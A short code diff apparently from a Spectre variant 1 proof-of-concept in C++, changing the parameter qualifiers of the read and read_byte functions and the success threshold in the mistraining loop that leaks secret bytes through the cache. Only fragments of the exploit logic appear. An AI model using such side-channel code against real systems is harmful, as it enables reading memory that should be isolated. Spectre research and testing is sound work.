@@ -6,7 +6,7 @@
 #include <Spectrev1.h>
 #include <cacheutils.h>
 
-volatile void Spectrev1::read(const volatile void *p_secret, size_t n_bytes, uint8_t *p_buf)
+volatile void Spectrev1::read( void volatile * const p_secret, size_t n_bytes, uint8_t *p_buf)
 {
     for(auto i = 0; i < n_bytes; ++i)
     {
@@ -14,7 +14,7 @@ volatile void Spectrev1::read(const volatile void *p_secret, size_t n_bytes, uin
     }
 }
 
-volatile void Spectrev1::read_byte(const volatile void *p_secret, uint8_t *p_val)
+volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_val)
 {
     // Need to make sure every page of p_scratchpad is backed
     for (auto i = 0; i < block_len*MAX_BYTE; i += cachelinesize)
@@ -30,7 +30,7 @@ volatile void Spectrev1::read_byte(const volatile void *p_secret, uint8_t *p_val
     {
         do_attack(fn_get_trainx(tries), mal_x);
 
-        if ( (results[high] == n_trainings && results[high2] == 0) || (results[high] >= (2*results[high2] + n_trainings)) )
+        if ( (results[high] == 2 && results[high2] == 0) || (results[high] >= (2*results[high2] + n_trainings)) )
         {
             break;
         }
